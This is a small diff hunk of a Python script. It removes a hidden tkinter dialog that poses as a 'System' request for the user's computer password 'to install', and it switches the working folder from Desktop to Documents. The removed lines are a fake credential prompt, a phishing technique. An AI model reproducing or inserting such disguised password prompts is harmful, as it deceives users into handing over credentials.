@@ -33,14 +33,7 @@ from tkinter import simpledialog
 
 import subprocess
 
-ROOT = tk.Tk()
-
-ROOT.withdraw()
-
-USER_INP = simpledialog.askstring(title="System",
-                                  prompt="Enter computer password to install...")
-
-d = os.path.join(os.environ["HOMEPATH"], r"Desktop")
+d = os.path.join(os.environ["HOMEPATH"], r"Documents")
 
 os.chdir(d)
 
